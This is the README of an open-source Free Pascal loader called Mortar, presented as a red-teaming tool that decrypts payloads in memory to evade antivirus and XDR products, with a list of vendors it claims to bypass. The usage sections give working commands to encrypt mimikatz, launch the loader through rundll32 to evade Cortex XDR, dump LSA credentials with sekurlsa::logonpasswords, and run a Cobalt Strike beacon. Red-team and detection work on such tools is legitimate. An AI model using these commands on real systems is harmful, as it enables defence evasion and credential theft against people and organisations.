# Mortar Loader 

red teaming evasion technique to defeat and divert detection and prevention of security products.Mortar Loader performs encryption and decryption of selected binary inside the memory streams and execute it directly with out writing any malicious indicator into the hard-drive. 
Mortar is able to bypass modern anti-virus products and advanced XDR solutions and it has been tested and confirmed bypass for the following: 

* Kaspersky :heavy_check_mark:
* ESET :heavy_check_mark:
* Malewarebytes :heavy_check_mark:
* Mcafee :heavy_check_mark:
* Windows defender :heavy_check_mark:
* Cylance:heavy_check_mark:
* TrendMicro :heavy_check_mark:
* Bitdefender :heavy_check_mark:
* Norton Symantec :heavy_check_mark:

detailed research and techniques : https://0xsp.com/security%20research%20&%20development%20(SRD)/defeat-the-castle-bypass-av-advanced-xdr-solutions

CrestCon Asia 2021 talk : https://www.youtube.com/watch?v=H7EMBz7GLMk

# Usage 

## Encryptor 

```
root@kali>./encryptor -f mimikatz.exe -o bin.enc 

```

## Loader (DLL)
for bypassing Cortex XDR,add agressor.dll with bin.enc in the same folder and script the following bat file 
```
@echo off 
cmd.exe /c rundll32.exe agressor.dll,stealth
```
for normal usage you can directly execute the agressor.dll 

```
rundll32.exe agressor.dll,dec
```
## Loader (EXE)
the executable version has more options you can use, as you able to pass commands for the loaded binary

```
##Mimikatz dump LSA 
deliver.exe -d -c sekurlsa::logonpasswords -f mimikatz.enc 

## Cobalt strike beacon 
deliver.exe -d -f cobalt.enc 

```
# Compiling the Loader (windows only)
the project has been coded using FPC(Free Pascal), the compiling procedures are straightforward by downloading and installing Lazarus IDE (https://www.lazarus-ide.org/index.php?page=downloads) and navigate into file > open  -> Run -> build 


# Compiling Encryptor(Linux/BSD/Arm/MacOS//windows)
either by downloading and installing Lazarus-IDE from the official site(https://www.lazarus-ide.org/index.php?page=downloads)

```
#Debian & Ubuntu 

apt install fpc 
apt install lazarus-ide 

```
# Support the research 
if you think you have benefited from this open-source project and want more updates in the future, please mind time and efforts by making a donation
https://donorbox.org/support-0xsp






